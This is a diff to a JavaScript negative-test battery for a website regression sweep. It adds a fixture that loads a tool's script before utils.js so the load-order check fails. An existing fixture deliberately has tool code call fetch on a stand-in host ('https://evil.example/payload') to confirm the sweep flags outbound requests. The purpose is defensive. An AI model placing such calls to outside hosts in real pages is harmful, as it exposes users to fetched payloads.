@@ -1,10 +1,10 @@
 /* ============================================
    Negative-test battery for the Story 2.12 regression
-   sweep. For each of the 6 checks the sweep performs,
+   sweep. For each of the 7 checks the sweep performs,
    inject a known-broken fixture and assert the expected
    check flips to false. If any check stays true under
    its broken fixture, the sweep has a vacuous pass and
-   210/210 is meaningless.
+   245/245 is meaningless.
 
    Strategy: copy the sweep source to a tmp dir with
    `const REPO` rewritten to point at a scratch fixture
@@ -17,15 +17,20 @@
    catches.
 
    The negative fixtures cover:
-     check 1 schema  — entry missing required field
-     check 2 HTML    — index.html missing data-slug
-     check 3 JS load — JS throws on parse
-     check 4 history — push mis-routes to wrong key
-     check 5 console — JS calls console.error('neg')
-     check 6 fetch   — JS calls fetch('https://evil.example/')
+     check 1 schema          — entry missing required field
+     check 2 HTML            — index.html missing data-slug
+     check 3 JS load         — JS throws on parse
+     check 4 history         — push mis-routes to wrong key
+     check 5 console         — JS calls console.error('neg')
+     check 6 fetch           — JS calls fetch('https://evil.example/')
+     check 7 scriptLoadOrder — <slug>.js loads BEFORE utils.js
+                              (reproduces the citation-formatter /
+                              diff-viewer / jwt-inspector regression
+                              surfaced in the post-home-redesign
+                              retrofit on 2026-08-13)
 
    Exit codes:
-     0 — all 6 negative tests caught their bug
+     0 — all 7 negative tests caught their bug
      1 — at least one negative test passed (bug not caught)
      2 — vacuous (no negative tests ran)
    ============================================ */
@@ -53,6 +58,26 @@ function writeFixtureRepo(baseDir) {
 
 function wrapHtml(slug, inner) {
   return '<!DOCTYPE html>\n<html lang="en">\n<head><meta charset="utf-8"><title>' + slug + '</title></head>\n<body>\n<main aria-label="tool" data-slug="' + slug + '">\n' + inner + '\n</main>\n</body>\n</html>';
+}
+
+/* Broken load-order fixture: places the tool's own script BEFORE
+   utils.js so the regression sweep's check 7 (scriptLoadOrder)
+   catches the misorder. Mirrors the actual regression pattern that
+   citation-formatter / diff-viewer / jwt-inspector shipped with in
+   2026-08-13: an extra helper script (citation-styles.js / diff.js /
+   jwt-codec.js) followed immediately by the tool's own script, and
+   utils.js landing AFTER both. The synthetic <main> shell keeps the
+   tool JS itself clean so check 3 (jsLoad) still passes — only the
+   load order is wrong. */
+function wrapHtmlBrokenLoadOrder(slug, inner) {
+  return (
+    '<!DOCTYPE html>\n<html lang="en">\n<head><meta charset="utf-8"><title>' + slug + '</title></head>\n<body>\n' +
+    '<script src="./extra-helper.js"></script>\n' +
+    '<script src="./' + slug + '.js"></script>\n' +
+    '<script src="../../assets/js/utils.js"></script>\n' +
+    '<main aria-label="tool" data-slug="' + slug + '">\n' + inner + '\n</main>\n' +
+    '</body>\n</html>'
+  );
 }
 
 function pushEntry(baseDir, entry) {
@@ -189,6 +214,23 @@ const TESTS = [
       pushEntry(baseDir, entry);
       const js = 'HT.fetch("https://evil.example/payload");\n';
       writeTool(baseDir, 'neg-fetch', wrapHtml('neg-fetch', '<div id="root"></div>'), js);
+    },
+  },
+  {
+    name: 'check 7 scriptLoadOrder (<slug>.js before utils.js)',
+    expectedCheck: 'scriptLoadOrder',
+    build: function (baseDir) {
+      const entry = makeValidEntry('neg-script-order');
+      pushEntry(baseDir, entry);
+      /* The JS body is intentionally benign — we want check 3 (jsLoad)
+         to stay green so the failure is unambiguously on check 7. */
+      const js = '// benign — the broken shape is the script order, not the JS body\n';
+      writeTool(
+        baseDir,
+        'neg-script-order',
+        wrapHtmlBrokenLoadOrder('neg-script-order', '<div id="root"></div>'),
+        js
+      );
     },
   },
 ];
